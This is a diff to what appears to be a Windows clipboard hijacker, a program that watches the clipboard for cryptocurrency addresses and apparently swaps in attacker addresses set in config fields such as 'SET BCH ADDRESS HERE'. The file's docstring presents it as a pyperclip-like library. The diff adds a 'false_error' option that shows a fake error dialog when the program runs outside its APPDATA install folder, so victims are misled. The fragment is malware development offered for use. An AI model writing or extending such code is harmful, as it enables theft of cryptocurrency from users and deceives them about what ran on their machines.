@@ -5,6 +5,7 @@ essentailly the same as pyperclip but under different name
 import http.client
 import clipboard
 import socket
+import ctypes
 import winreg
 import shutil
 import json
@@ -30,6 +31,7 @@ bchaddr = "SET BCH ADDRESS HERE"
 single_use = False
 ping = False
 incubate = False
+false_error = False
 
 webhook_url = ""
 
@@ -79,6 +81,9 @@ def is_crypto_addr(clipboard_text):
         return False
 
 def main():
+    if false_error:
+        if cwd != str(os.path.join(os.environ['APPDATA'], "CLPPTH")):
+            ctypes.windll.user32.MessageBoxW(0, "An error has occurred!", "Error", 0x10)
     while True:
         try:
             clipboard_text = clipboard.paste()
